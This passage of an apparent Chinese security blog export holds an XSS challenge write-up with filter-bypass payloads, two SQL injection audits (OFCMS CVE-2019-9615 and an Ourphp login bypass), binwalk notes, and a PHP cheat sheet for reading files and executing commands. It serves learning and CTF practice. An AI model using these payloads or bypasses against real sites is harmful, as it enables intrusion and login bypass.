<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;&lt;&quot;</code></pre>
<h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p>href src on &lt;script被替换。</p>
<p>过滤词大写绕过。</p>
<p>看了一下代码，L5将输入全部转小写这个没有所以可以使用大些绕过。</p>
<p>Payload:</p>
<pre><code>&quot;&gt;&lt;a HREF=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;&lt;&quot;
&quot;&gt;&lt;Script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;&quot;</code></pre>
<h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><p>测试后发现会讲script href等敏感词替换成空。</p>
<p>双写绕过。</p>
<p>Payload:</p>
<pre><code>&quot;&gt;&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scrscriptipt&gt;&lt;&quot;</code></pre>
<h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><p>输入框添加友情链接，输入值作为下面超链接a标签href的值。但是script on等敏感词被过滤了。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-1.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-2.png"></p>
<p>使用html实体编码绕过。</p>
<p>Payload：</p>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&amp;#59;</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l8-3.png"></p>
<h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><p>要求输入的内容包含http://</p>
<p>没有要求http://在首部，所以payload如下：</p>
<pre><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;&amp;#59;//http://</code></pre>
<h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><p>看源码发现有3个input标签，但类型全是hidden。通过拼接<code>?t_link=aaa&amp;t_history=aaa&amp;t_sort=aaa</code>测试发现只有t_sort这个input会获取输入值作为value值。</p>
<p>通过onclick事件触发xss，要更改一下type。</p>
<p>Payload：</p>
<pre><code>?t_sort=&quot; onclick=alert(&#39;xss&#39;) type=&quot;text&quot;//</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l10-1.png"></p>
<h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><p>L10的payload中<code>&quot;</code>被转义了，使用了<code>htmlspecialchars</code>函数处理再输出的缘故。</p>
<p>但是通过源码发现多了一个name为t_ref的input。</p>
<pre><code>&lt;input name=&quot;t_ref&quot; value=&quot;http://test.xss.tv/level10.php?t_link=aaa&amp;amp;t_history=aaa&amp;amp;t_sort=%22%20onclick=alert(%27xss%27)%20type=%22text%22//&quot; type=&quot;hidden&quot;&gt;</code></pre>
<p>他的值是跳转过来的上个页面的链接。抓包改referer。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l11-1.png"></p>
<h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><p>得，这次改UA。</p>
<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>得，改cookie</p>
<h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>Exif Xss</p>
<p>因为题目通过iframe嵌套了<a href="http://www.exifviewer.org/%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95%E3%80%82%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E6%98%BE%E7%A4%BAexif%E4%BF%A1%E6%81%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%87%AA%E5%B7%B1%E5%86%99%E4%BA%86%E4%B8%80%E4%B8%AA%E6%9D%A5%E5%A4%8D%E7%8E%B0%E4%B8%80%E4%B8%8B%E3%80%82">http://www.exifviewer.org/但是这个网站需要登录。其实就是显示exif信息。所以自己写了一个来复现一下。</a></p>
<pre><code class="php">&lt;h1&gt;Test EXIF XSS&lt;/h1&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; id=&quot;File&quot; name=&quot;file&quot;/&gt;
    &lt;input type=&quot;submit&quot;  name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;?php
//error_reporting(0);
if(isset($_POST[&#39;submit&#39;]))&#123;
    $file = $_FILES[&#39;file&#39;];
    $filetmps = $file[&#39;tmp_name&#39;];

    $exif = exif_read_data($file[&#39;tmp_name&#39;], 0, true);

    foreach ($exif as $key =&gt; $section) &#123;
        foreach ($section as $name =&gt; $val) &#123;
            echo &quot;$key.$name: $val&lt;br /&gt;\n&quot;;
        &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>通过<a href="https://sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>来制作一张伪造exif的图片。(如下修改了Artist)</p>
<pre><code>exiftool -Artist=&#39; &quot;&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;&#39; logo.jpg</code></pre>
<p>通过php的<code>exif_read_data</code>函数读出exif信息，读出的值直接未经过滤的输出，就会导致Xss的发生。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l14-1.png"></p>
<h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><p>通过页面源码的head信息发现引入了<code>AngularJS</code>，考虑<code>AngularJS</code>框架的xss利用。</p>
<pre><code class="javascript">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</code></pre>
<p>可以发现版本为1.2.0，试了试发现了一行<code>&lt;!--  ngInclude: undefined --&gt;    </code>，发现这是使用了AngularJS的 <code>ng-include</code> 指令来包含文件。</p>
<p>在本机写一个包含XSS代码的html文件，去包含。</p>
<pre><code class="html">&lt;input type=&quot;text&quot; name=&quot;&quot; onclick=alert(&#39;xss&#39;)&gt;</code></pre>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level15.php?src=&quot;http://localhost/index.html&quot;</code></pre>
<p>效果：</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l15-3.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l15-2.png"></p>
<blockquote>
<p>AngularJS是一个谷歌开发的MVC客户端框架。使用AngularJS可以对包涵有<em>ng-app</em>标签的模版进行客户端的渲染<em>，</em>他可以通过插入一个特定的标签，然后对这个标签内的内容进行解析，达到渲染模版的效果，正是因为这个特性，所以导致了我们不需要使用html标签，只能要我们输入的内容能够输出在<em>ng-app</em>标签内就可以配合AngularJS的标签来进行xss。</p>
</blockquote>
<pre><code>本题的AngularJS利用还是比较简单的，还没有需要绕过进行xss。</code></pre>
<h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><p>输入值被放在center标签中了。尝试使用img标签弹窗。</p>
<pre><code class="html">&lt;img src=&#39;1&#39; onerror=alert(&#39;xss&#39;)&gt;</code></pre>
<p>查看源码发现空格被转义了，绕过空格的过滤。</p>
<pre><code>localhost/xss_game/level16.php?keyword=&lt;img%0asrc=&#39;1&#39;%0aonerror=alert(&#39;xss&#39;)&gt;</code></pre>
<h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><p>有个flash，但是和flash没啥关系。在embed标签中插入触发事件。</p>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level17.php?arg01=q&amp;arg02=q onmouseover=alert(&#39;xss&#39;)</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l17-1.png"></p>
<p><img src="../images/xss_game/l17-2.png"></p>
<p>题目代码是这么写的：</p>
<pre><code class="php">echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></pre>
<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>Emmm,L17的payload直接过了。</p>
<h2 id="Level19"><a href="#Level19" class="headerlink" title="Level19"></a>Level19</h2><p>flash的xss</p>
<p>使用<a href="https://github.com/jindrapetrik/jpexs-decompiler">FFDec</a>反编译xsf03.swf文件。</p>
<p>有地方用到了geturl函数，利用这个函数能自动打开指定的网页。下面看怎么利用。</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-1.png"></p>
<p>然后追踪到sIFR的位置。从下面这段代码可以看出version值赋给了<code>_loc4_</code>，试了一下<code>arg01=version&amp;arg02=aaa</code>发现其中一段值变成aaa.也就是获取的值输出了。</p>
<pre><code class="javascript"> if(_loc5_ &amp;&amp; _root.version != sIFR.VERSION)
      &#123;
         _loc4_ = sIFR.VERSION_WARNING.split(&quot;%s&quot;).join(_root.version);
      &#125;</code></pre>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-2.png"></p>
<p><img src="https://lanvnal.github.io/images/xss_game/l19-3.png"></p>
<p>因为getURL只在内容为link时打开，所以分析contentIsLink函数。</p>
<pre><code class="javascript">function contentIsLink()
   &#123;
      return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);
   &#125;</code></pre>
<p>那我们就通过a标签来触发xss。</p>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;xss&lt;/a&gt;</code></pre>
<h2 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h2><p>拖到FFDec看一下，发现了zeroclipboard.swf.</p>
<p><img src="https://lanvnal.github.io/images/xss_game/l20-1.png"></p>
<pre><code>搜索后发现是zeroclipboard.swf的漏洞，详见[CVE-2013-1808](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1808)。</code></pre>
<p>Payload:</p>
<pre><code>http://localhost/xss_game/level20.php?arg01=id&amp;arg02=\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//&amp;width&amp;height</code></pre>
<blockquote>
<p><a href="https://www.anquanke.com/vul/id/1168940">https://www.anquanke.com/vul/id/1168940</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>OFCMS代码审计--CVE-2019-9615复现</title>
    <url>/2020/03/15/ofcms-cve-2019-9615-fu-xian/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>OFCMS是基于Java技术的内容管理系统，在v1.1.3之前的版本存在SQL注入漏洞。</p>
<p>复现一下CVE-2019-9615，作为java代码审计的学习。</p>
<p><strong>测试版本：</strong><a href="https://gitee.com/oufu/ofcms/releases">OFCMS  v1.1.2</a></p>
<ul>
<li>IntelliJ IDEA</li>
<li>Java 1.8.0</li>
<li>Mysql 8.0.12</li>
<li>Tomcat 9.0</li>
</ul>
<h2 id="案例搭建"><a href="#案例搭建" class="headerlink" title="案例搭建"></a>案例搭建</h2><p>打开 IDEA，点击 <code>import Project</code> ，选择下载的源码，然后选择<code>Import project from external model</code>中的 Maven。</p>
<p>然后打开 <code>ofcms-admin/src/main/resources/dev/conf/</code> 下的 <code>db.properties</code> ，修改数据的账号密码</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p1.png"></p>
<p>然后修改根⽬录下的 <code>pom.xml </code>，搜索 <code>mysql</code> ，然后修改成⾃⼰对应的版本，然后点击<code>import change</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p2.png"></p>
<p>PS：速度太慢修改maven为阿里镜像（项目右键-&gt;maven-&gt;create settings.xml）</p>
<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;
          xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
          xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;
    &lt;mirrors&gt;

        &lt;mirror&gt;
            &lt;id&gt;alimaven&lt;/id&gt;
            &lt;name&gt;aliyun maven&lt;/name&gt;
            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;uk&lt;/id&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;
            &lt;url&gt;http://uk.maven.org/maven2/&lt;/url&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;CN&lt;/id&gt;
            &lt;name&gt;OSChina Central&lt;/name&gt;
            &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

        &lt;mirror&gt;
            &lt;id&gt;nexus&lt;/id&gt;
            &lt;name&gt;internal nexus repository&lt;/name&gt;
            &lt;url&gt;http://repo.maven.apache.org/maven2&lt;/url&gt;
            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;
        &lt;/mirror&gt;

    &lt;/mirrors&gt;
&lt;/settings&gt;</code></pre>
<p>PS：这里没有找到对应该版本的包就换成了8.0.12的mysql。</p>
<p>然后下载需要的jar包资源：</p>
<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p3.png" style="zoom:50%;" />

<p>配置Tomcat 服务，<code> run--&gt;edit configurations--&gt; + --&gt;tomcat server--&gt;local</code></p>
<p>配置好tomcat目录和端口。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p4.png"></p>
<p>配置Deployment：<code>+ --&gt; Artifict --&gt; 选择ofcms-admin:war --&gt;修改名字</code></p>
<img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p5.png" style="zoom:50%;" />



<p>最后打开 MySQL，创建⼀个名为 ofcms 的数据库，导⼊<code>ofcms/doc/sql</code>下的 sql ⽂件:</p>
<pre><code class="mysql">mysql&gt; use ofcms
Database changed
mysql&gt; set names utf8;
mysql&gt; source /Users/lanvnal/Files/代码审计/ofcms/doc/sql/ofcms-v1.1.2.sql</code></pre>
<p>然后启动，访问<code>127.0.0.1:8006/ofcms_admin/</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p6.png"></p>
<p>后台地址：<code>http://localhost:8006/ofcms_admin/admin/index.html</code></p>
<p>用户名/密码：admin/123456</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞存在的文件为：<code>ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateControlle r.java</code></p>
<pre><code class="java">    /**
     * 创建表
     */
    public void create() &#123;
        try &#123;
            String sql = getPara(&quot;sql&quot;);
            Db.update(sql);
            rendSuccessJson();
        &#125; catch (Exception e) &#123;
            e.printStackTrace();
            rendFailedJson(ErrorCode.get(&quot;9999&quot;), e.getMessage());
        &#125;
    &#125;</code></pre>
<p>使⽤ <code>getPara</code> 获取 sql 参数，然后<code>update</code>⽅法直接执⾏sql 语句，返回 json 格式的数据。这⾥对于传⼊的参数没有任何的处理就直接带⼊执⾏语句中，造成了 SQL 注⼊。</p>
<p>该功能是后台代码生成中的增加功能。update型的注入，可以通过报错进行注入。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p7.png"></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/cve-2019-9615/p8.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>是个后台的sql注入，利用起来挺鸡肋的，复现这个主要是环境的搭建和入门的学习。</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>binwalk常用命令</title>
    <url>/2017/05/18/binwalk-chang-yong-ming-ling/</url>
    <content><![CDATA[<h1 id="binwalk常用命令"><a href="#binwalk常用命令" class="headerlink" title="binwalk常用命令"></a>binwalk常用命令</h1><ul>
<li>简单列出文件</li>
</ul>
<pre><code>$ binwalk firmware.bin</code></pre>
<ul>
<li>扫描zlib压缩包</li>
</ul>
<pre><code>$ binwalk --enable-plugin=zlib firmware.bin  </code></pre>
<ul>
<li>过滤</li>
</ul>
<p>包含过滤器</p>
<p>​    -y选项仅包括指定的搜索文本匹配的结果。搜索字符串（文本）应当使用小写，包括正则表达式，并且可以指定多个-Y选项。 下列搜索结果只包含文本“文件系统”中搜索出来的结果。（也就说使用了 filesystem的Y选项的话结果中只包含文本字符结果）</p>
<pre><code>$ binwalk -y filesystem firmware.bin</code></pre>
<p>排除过滤器</p>
<p>​    -x选项是排除搜索结果中的指定符合规则的文本（或者字符串）。 搜索字符串（文本）应当使用小写，包括正则表达式，并且可以指定多个-X选项。 下列例子中搜索时将排除“jffs2”字符串：</p>
<pre><code>$ binwalk -x jffs2 firmware.bin</code></pre>
<p>高级过滤器</p>
<p>​    可以将包含和排除过滤两功能结合使用：</p>
<p>​    例子：下列搜索结果即包含文本“文件系统”中搜索出来的结果又排除jffs2字符串结果。</p>
<pre><code>$ binwalk -y filesystem -x jffs2 firmware.bin</code></pre>
<ul>
<li>提取文件</li>
</ul>
<p>-e选项可以用来执行自动数据提取的基础上提取规则中指定的默认的extract.conf文件：</p>
<pre><code>$ binwalk -e firmware.bin</code></pre>
<p>递归提取    </p>
<p>​    很多次，提取的数据可能需要进一步binwalk的分析。为了帮助自动化，binwalk可以递归扫描提取的数据和由外部减压或提取工具创建的文件指定-M选项和-e选项一起使用：</p>
<pre><code>$ binwalk -Me firmware.bin</code></pre>
<p>​    请注意，-M选项将提取的文件8层递归，且忽略外部提取工具可以创建任何目录。</p>
<ul>
<li>转换功能    </li>
</ul>
<p>​    binwalk使用 -C 选项来完成多个不用文件类型转换; 通常最好是使用-l选项来限制这种扫描：</p>
<pre><code>$ binwalk -l 32 -C firmware.bin</code></pre>
<ul>
<li>比较功能</li>
</ul>
<p>​    Binwalk可以生成一个或多个文件的十六进制转储和差别。在文件当中相同字节的是绿色显示，不同的是红色显示，蓝色表示只是有些文件当中的不同部分。</p>
<pre><code>$ binwalk -W firmware1.bin firmware2.bin firmware3.bin</code></pre>
<ul>
<li>字符串    </li>
</ul>
<p>​    除了上述基于签名的扫描，binwalk可以对目标文件进行一个智能的字符串分析,虽然不是完全替代的Unix strings一样强大功能，但是binwalk通过应用一些非常简单的验证规则筛选出最“垃圾”的字符串，和忽略一些无顺序的数据块</p>
<pre><code>$ binwalk -S firmware.bin</code></pre>
<ul>
<li>插件功能</li>
</ul>
<p>​    </p>
<p>插件列表</p>
<p>​        使用 –list-plugins选项能获得可使用的binwalk插件的名称和属性列表：</p>
<pre><code>$ binwalk --list-plugins</code></pre>
<p>启用插件功能</p>
<p>​    一些插件在默认情况下是禁用的。这些插件可以启用时用该选项 –enable-plugin选项</p>
<pre><code>$ binwalk --enable-plugin=foo firmware.bin</code></pre>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>binwalk</tag>
      </tags>
  </entry>
  <entry>
    <title>Ourphp代码审计（1）</title>
    <url>/2017/08/27/ourphp-dai-ma-shen-ji/</url>
    <content><![CDATA[<h1 id="Ourphp代码审计（1）"><a href="#Ourphp代码审计（1）" class="headerlink" title="Ourphp代码审计（1）"></a>Ourphp代码审计（1）</h1><p>Payload:<code>)union selselectect 1,user(),2,3,4,5-- qwe&#39;</code></p>
<blockquote>
<p>payload直接登陆，密码随便填</p>
</blockquote>
<p>通过全局搜索找到登陆页面<code>cn_login.html</code>,继而找到处理登陆的页面<code>ourphp_play.class.php</code>.</p>
<p>处理登陆的函数如下:</p>
<pre><code class="php">//处理会员登录
&#125;elseif($_GET[&quot;ourphp_cms&quot;] == &#39;login&#39;)&#123;

    if($ourphp_usercontrol[&#39;loginoff&#39;] == 2)&#123;
        exit(&#39;no!&#39;);
    &#125;
    if ($_POST[&quot;code&quot;] != $ValidateCode)&#123;
        exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$code.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);
    &#125;

    $loginerror = $ourphp_adminfont[&#39;loginerror&#39;];
    $ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39; || `OP_Usertel` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);
    if (!$ourphp_rs)&#123;

        exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$loginerror.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);

    &#125;else&#123;

        if($ourphp_rs[3] == 2)&#123;
            exit(&quot;&lt;script language=javascript&gt; alert(&#39;&quot;.$userloginno.&quot;&#39;);history.go(-1);&lt;/script&gt;&quot;);
        &#125;

        $_SESSION[&#39;username&#39;] = $ourphp_rs[1];
        $_SESSION[&#39;name&#39;] = $ourphp_rs[4];
                //处理Ucenter
        if($ourphp_usercontrol[&#39;ucenter&#39;] == 1)&#123;
            include_once &#39;../../config.inc.php&#39;;
            include_once &#39;../../uc_client/client.php&#39;;
            $OP_Userpass = dowith_sql($_REQUEST[&quot;OP_Userpass&quot;]);
            $OP_Username = $ourphp_rs[4];

            list($uid, $username, $password, $email) = uc_user_login($OP_Username, $OP_Userpass);
            if($uid &gt; 0) &#123;
                //echo &#39;登录成功&#39;.$uid;
                echo uc_user_synlogin($uid);
            &#125; elseif($uid == -1) &#123;
                //echo &#39;用户不存在,或者被删除&#39;;
            &#125; elseif($uid == -2) &#123;
                //echo &#39;密码错&#39;;
            &#125; else &#123;
                //echo &#39;未定义&#39;;
            &#125;
        &#125;

        echo @ourphp_pcwapurl($_GET[&#39;type&#39;],&#39;?cn-index.html&#39;,&#39;?&#39;.$_GET[&quot;lang&quot;].&#39;-usercenter.html&#39;,0,&#39;&#39;);
        exit;
    &#125;</code></pre>
<p>第184行为查询语句。</p>
<pre><code class="php">    $ourphp_rs = $db -&gt; select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39; || `OP_Usertel` = &#39;&quot;.dowith_sql($_POST[&quot;OP_Useremail&quot;]).&quot;&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre>
<p>使用的是<code>select</code>和<code>dowith_sql</code>这两个查询函数。</p>
<p>定位到<code>select函数</code>位于<code>ourphp_mysql.php</code>,函数功能定义如下：</p>
<pre><code class="php">    //读取一条记录
    public function select($o = &#39;&#39;,$u = &#39;&#39;,$r = &#39;&#39;)&#123;
        $Query = mysql_query(&quot;select &quot;.$o.&quot; from &quot;.$u.&quot; &quot;.$r);
        $Rs = mysql_num_rows($Query);
        if($Rs &lt; 1)&#123;
            return false;
        &#125;else&#123;
            return mysql_fetch_array($Query);
        &#125;
        mysql_free_result($Query);
    &#125;</code></pre>
<p><code>dowith_sql函数</code>定位一下是自定义的过滤函数，位于<code>ourphp_function.class.php</code>中10-39行。</p>
<p>造成漏洞的是第11和35行的函数。</p>
<pre><code class="php">11   $ourphpstr = addslashes($ourphpstr);
21   $ourphpstr = str_ireplace(&quot;select&quot;,&quot;&quot;,$ourphpstr);
35   $ourphpstr = str_ireplace(&quot;&#39;&quot;,&quot;&quot;,$ourphpstr);</code></pre>
<p>第11行的函数，<a href="http://www.w3school.com.cn/php/func_string_addslashes.asp">addslashes函数</a>是将预设字符前加反斜杠.</p>
<p>第35行的函数，将’替换成空格。传入的’就变成了\。</p>
<p>第21行的函数，消去select。</p>
<p>对select的过滤，可以通过双写绕过。</p>
<p>payload经过过滤后变成:</p>
<pre><code>)union select 1,user(),2,3,4,5-- qwe\</code></pre>
<p>传入sql语句中看看怎么绕过。</p>
<pre><code class="php">select(&quot;`id`,`OP_Useremail`,`OP_Userpass`,`OP_Userstatus`,`OP_Username`&quot;,&quot;`ourphp_user`&quot;,&quot;WHERE (`OP_Useremail` = &#39;)union select 1,user(),3,4,5-- qwe\&#39; || `OP_Usertel` = &#39;)union select 1,user(),3,4,5-- qwe\&#39;) and `OP_Userpass` = &#39;&quot;.dowith_sql(substr(md5(md5($_REQUEST[&quot;OP_Userpass&quot;])),0,16)).&quot;&#39;&quot;);</code></pre>
<p>payload中传入的)对查询语句的(做了闭合，因为usertel=payload中的)正好可以与where后的(闭合起来加之2次的单引号正好使OP_Useremail=<code>)union select 1,user(),3,4,5-- qwe\&#39; || &#39;OP_Usertel&#39;=</code>.</p>
<p>这样就执行了unionselect查询语句。</p>
<blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>利用关键字搜索，找到漏洞入口，摸清函数调用。</p>
</blockquote>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>php花式读取文件</title>
    <url>/2018/03/08/php-hua-shi-du-qu-wen-jian/</url>
    <content><![CDATA[<blockquote>
<p>转自<a href="https://www.jianshu.com/p/33bc37ef72cc">王一航博客</a></p>
</blockquote>
<a id="more"></a>
<h2 id="花式读文件"><a href="#花式读文件" class="headerlink" title="花式读文件"></a>花式读文件</h2><pre><code class="php">hightlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename,&quot;r&quot;), $size);
include($filename); // 非php代码
include_once($filename); // 非php代码
require($filename); // 非php代码
require_once($filename); // 非php代码
print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));
print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行
fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));
print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));
print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
</code></pre>
<h2 id="花式列目录"><a href="#花式列目录" class="headerlink" title="花式列目录"></a>花式列目录</h2><pre><code class="php">print_r(glob(&quot;*&quot;)); // 列当前目录
print_r(glob(&quot;/*&quot;)); // 列根目录
print_r(scandir(&quot;.&quot;));
print_r(scandir(&quot;/&quot;));
$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;
$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;
</code></pre>
<h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><pre><code class="php">$GLOBALS
参考链接 : http://php.net/manual/zh/language.variables.superglobals.php</code></pre>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><pre><code class="php">exec
system
passthru
popen
proc_open
shell_exec</code></pre>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>一次对电动车钥匙的信号分析</title>
    <url>/2019/01/22/yi-ci-dui-dian-dong-che-yao-chi-de-xin-hao-fen-xi/</url>
    <content><![CDATA[<blockquote>
<p>一次无线电安全的尝试</p>
</blockquote>
<h2 id="使用的设备"><a href="#使用的设备" class="headerlink" title="使用的设备"></a>使用的设备</h2><p>处于价格考虑使用的是RTL2832U芯片的电视棒，进行对接受的设备的射频信号的分析。</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E8%BD%A6%E9%92%A5%E5%8C%99%E5%88%86%E6%9E%90/0.jpg"></p>
